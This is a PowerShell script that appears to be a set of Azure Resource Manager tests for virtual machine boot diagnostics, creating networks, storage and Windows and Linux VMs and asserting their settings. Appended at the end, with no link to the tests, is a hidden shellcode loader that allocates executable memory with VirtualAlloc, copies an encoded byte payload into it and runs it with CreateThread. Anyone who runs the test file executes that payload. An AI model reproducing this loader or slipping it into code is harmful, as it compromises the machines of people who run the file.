function Test-VirtualMachineBootDiagnostics{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A4';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId -Primary;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Primary $true;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage -loc $loc;$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;Assert-AreEqual $p.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $p.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $p.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $p.StorageProfile.ImageReference.Version $imgRef.Version;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $vm1.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $vm1.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $vm1.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $vm1.StorageProfile.ImageReference.Version $imgRef.Version;Assert-AreEqual $vm1.OSProfile.AdminUsername $user;Assert-AreEqual $vm1.OSProfile.ComputerName $computerName;Assert-AreEqual $vm1.HardwareProfile.VmSize $vmsize;Assert-AreEqual $true $vm1.DiagnosticsProfile.BootDiagnostics.Enabled;Assert-AreEqual $stoaccount.PrimaryEndpoints.Blob $vm1.DiagnosticsProfile.BootDiagnostics.StorageUri;Wait-Seconds 600;$localpath = (Get-Item -Path ".\" -Verbose).FullNameGet-AzureRmVMBootDiagnosticsData -Windows -ResourceGroupName $rgname -Name $vmname -LocalPath $localpath;Remove-AzureRmVM -Name $vmname -ResourceGroupName $rgname -Force;$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/linuxos.vhd";$osDiskName = 'linuxOsDisk';$p = New-AzureRMVMConfig -VMName $vmname -VMSize $vmsize;$p = Add-AzureRMVMNetworkInterface -VM $p -Id $nicId;$p = Set-AzureRMVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$imgRef = Get-DefaultCRPLinuxImageOffline;$p = Set-AzureRMVMOperatingSystem -VM $p -Linux -ComputerName $computerName -Credential $cred$p = ($imgRef | Set-AzureRMVMSourceImage -VM $p);New-AzureRMVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRMVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $vm1.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $vm1.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $vm1.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $vm1.StorageProfile.ImageReference.Version $imgRef.Version;Assert-AreEqual $vm1.OSProfile.AdminUsername $user;Assert-AreEqual $vm1.OSProfile.ComputerName $computerName;Assert-AreEqual $vm1.HardwareProfile.VmSize $vmsize;Assert-AreEqual $true $vm1.DiagnosticsProfile.BootDiagnostics.Enabled;Assert-AreEqual $stoaccount.PrimaryEndpoints.Blob $vm1.DiagnosticsProfile.BootDiagnostics.StorageUri;Wait-Seconds 600;$bddata = Get-AzureRmVMBootDiagnosticsData -Linux -ResourceGroupName $rgname -Name $vmname | Out-String;Write-Output("BootDiagnosticsData:");Write-Output($bddata);}finally{Clean-ResourceGroup $rgname}}function Test-VirtualMachineBootDiagnosticsPremium{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRMResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_DS1';$vmname = 'vm' + $rgname;$p = New-AzureRMVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRMVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRMVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRMVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRMPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRMPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRMNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRMNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRMVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;$p = Add-AzureRMVMNetworkInterface -VM $p -Id $nicId -Primary;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Primary $true;$stoname = 'sto' + $rgname;$stotype = 'Premium_LRS';New-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'None';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$p = Set-AzureRMVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$p = Set-AzureRMVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage -loc $loc;$p = ($imgRef | Set-AzureRMVMSourceImage -VM $p);Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;Assert-AreEqual $p.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $p.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $p.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $p.StorageProfile.ImageReference.Version $imgRef.Version;New-AzureRMVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRMVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $vm1.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $vm1.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $vm1.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $vm1.StorageProfile.ImageReference.Version $imgRef.Version;Assert-AreEqual $vm1.OSProfile.AdminUsername $user;Assert-AreEqual $vm1.OSProfile.ComputerName $computerName;Assert-AreEqual $vm1.HardwareProfile.VmSize $vmsize;Assert-AreEqual $true $vm1.DiagnosticsProfile.BootDiagnostics.Enabled;Assert-AreNotEqual $stoaccount.PrimaryEndpoints.Blob $vm1.DiagnosticsProfile.BootDiagnostics.StorageUri;}finally{Clean-ResourceGroup $rgname}}function Test-LinuxVirtualMachineBootDiagnostics{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRMResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A4';$vmname = 'vm' + $rgname;$p = New-AzureRMVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRMVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRMVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRMVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRMPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRMPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRMNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRMNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRMVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$p = Set-AzureRMVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$imgRef = Get-DefaultCRPLinuxImageOffline;$p = Set-AzureRMVMOperatingSystem -VM $p -Linux -ComputerName $computerName -Credential $cred$p = ($imgRef | Set-AzureRMVMSourceImage -VM $p);Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;Assert-AreEqual $p.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $p.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $p.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $p.StorageProfile.ImageReference.Version $imgRef.Version;New-AzureRMVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRMVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $vm1.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $vm1.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $vm1.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $vm1.StorageProfile.ImageReference.Version $imgRef.Version;Assert-AreEqual $vm1.OSProfile.AdminUsername $user;Assert-AreEqual $vm1.OSProfile.ComputerName $computerName;Assert-AreEqual $vm1.HardwareProfile.VmSize $vmsize;Assert-AreEqual $true $vm1.DiagnosticsProfile.BootDiagnostics.Enabled;Assert-AreEqual $stoaccount.PrimaryEndpoints.Blob $vm1.DiagnosticsProfile.BootDiagnostics.StorageUri;Remove-AzureRMVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-VirtualMachineBootDiagnosticsSet{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRMResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A4';$vmname = 'vm' + $rgname;$p = New-AzureRMVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRMVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRMVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRMVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRMPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRMPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRMNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRMNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRMVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;$p = Add-AzureRMVMNetworkInterface -VM $p -Id $nicId -Primary;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Primary $true;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname;$stoname2 = $stoname + 'add';$stotype2 = 'Standard_GRS';New-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname2 -Location $loc -Type $stotype2;$stoaccount2 = Get-AzureRMStorageAccount -ResourceGroupName $rgname -Name $stoname2;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$p = Set-AzureRMVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$p = Set-AzureRMVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage -loc $loc;$p = ($imgRef | Set-AzureRMVMSourceImage -VM $p);Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;Assert-AreEqual $p.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $p.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $p.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $p.StorageProfile.ImageReference.Version $imgRef.Version;$p = Set-AzureRMVMBootDiagnostics -VM $p -Enable -ResourceGroupName $rgname -StorageAccountName $stoname2;New-AzureRMVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRMVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $vm1.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $vm1.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $vm1.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $vm1.StorageProfile.ImageReference.Version $imgRef.Version;Assert-AreEqual $vm1.OSProfile.AdminUsername $user;Assert-AreEqual $vm1.OSProfile.ComputerName $computerName;Assert-AreEqual $vm1.HardwareProfile.VmSize $vmsize;Assert-AreEqual $true $vm1.DiagnosticsProfile.BootDiagnostics.Enabled;Assert-AreEqual $stoaccount2.PrimaryEndpoints.Blob   $vm1.DiagnosticsProfile.BootDiagnostics.StorageUri;$vm1 | Set-AzureRMVMBootDiagnostics -Disable | Update-AzureRMVM$vm1 = Get-AzureRMVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-AreEqual $vm1.StorageProfile.ImageReference.Offer $imgRef.Offer;Assert-AreEqual $vm1.StorageProfile.ImageReference.Publisher $imgRef.PublisherName;Assert-AreEqual $vm1.StorageProfile.ImageReference.Sku $imgRef.Skus;Assert-AreEqual $vm1.StorageProfile.ImageReference.Version $imgRef.Version;Assert-AreEqual $vm1.OSProfile.AdminUsername $user;Assert-AreEqual $vm1.OSProfile.ComputerName $computerName;Assert-AreEqual $vm1.HardwareProfile.VmSize $vmsize;Assert-AreEqual $false $vm1.DiagnosticsProfile.BootDiagnostics.Enabled;Assert-AreEqual $stoaccount2.PrimaryEndpoints.Blob   $vm1.DiagnosticsProfile.BootDiagnostics.StorageUri;}finally{Clean-ResourceGroup $rgname}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc0,0xbf,0xf5,0x6e,0xa5,0x30,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0xe1,0x8c,0x50,0xcc,0xe1,0xd3,0x9b,0x2d,0xf1,0xb3,0x12,0xc8,0xc0,0xf3,0x41,0x98,0x72,0xc4,0x02,0xcc,0x7e,0xaf,0x47,0xe5,0xf5,0xdd,0x4f,0x0a,0xbe,0x68,0xb6,0x25,0x3f,0xc0,0x8a,0x24,0xc3,0x1b,0xdf,0x86,0xfa,0xd3,0x12,0xc6,0x3b,0x09,0xde,0x9a,0x94,0x45,0x4d,0x0b,0x91,0x10,0x4e,0xa0,0xe9,0xb5,0xd6,0x55,0xb9,0xb4,0xf7,0xcb,0xb2,0xee,0xd7,0xea,0x17,0x9b,0x51,0xf5,0x74,0xa6,0x28,0x8e,0x4e,0x5c,0xab,0x46,0x9f,0x9d,0x00,0xa7,0x10,0x6c,0x58,0xef,0x96,0x8f,0x2f,0x19,0xe5,0x32,0x28,0xde,0x94,0xe8,0xbd,0xc5,0x3e,0x7a,0x65,0x22,0xbf,0xaf,0xf0,0xa1,0xb3,0x04,0x76,0xed,0xd7,0x9b,0x5b,0x85,0xe3,0x10,0x5a,0x4a,0x62,0x62,0x79,0x4e,0x2f,0x30,0xe0,0xd7,0x95,0x97,0x1d,0x07,0x76,0x47,0xb8,0x43,0x9a,0x9c,0xb1,0x09,0xf2,0x51,0xf8,0xb1,0x02,0xfe,0x8b,0xc2,0x30,0xa1,0x27,0x4d,0x78,0x2a,0xee,0x8a,0x7f,0x01,0x56,0x04,0x7e,0xaa,0xa7,0x0c,0x44,0xfe,0xf7,0x26,0x6d,0x7f,0x9c,0xb6,0x92,0xaa,0x09,0xb2,0x04,0x07,0x9f,0x82,0xad,0xcf,0x1d,0xfb,0x5c,0x4c,0xab,0x1d,0x0e,0x3c,0xfb,0xb1,0xee,0xec,0xbb,0x61,0x86,0xe6,0x33,0x5d,0xb6,0x08,0x9e,0xf6,0x5c,0xe7,0x77,0xae,0xc8,0x9e,0xdd,0x24,0x69,0x5e,0xc8,0x40,0xa9,0xd4,0xff,0xb5,0x67,0x1d,0x75,0xa6,0x1f,0xed,0xc0,0x94,0x89,0xf2,0xfe,0xb3,0x35,0x67,0x05,0x12,0x62,0x1f,0x07,0x43,0x44,0x80,0xf8,0xa6,0xdf,0x09,0x6d,0x09,0xb7,0x75,0x61,0x89,0x47,0x20,0xeb,0x89,0x2f,0x94,0x4f,0xda,0x4a,0xdb,0x45,0x4e,0xc7,0x4e,0x66,0x27,0xb4,0xd9,0x0e,0xc5,0xe3,0x2e,0x91,0x36,0xc6,0xae,0xed,0xe0,0x2e,0xc5,0x1f,0x31;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};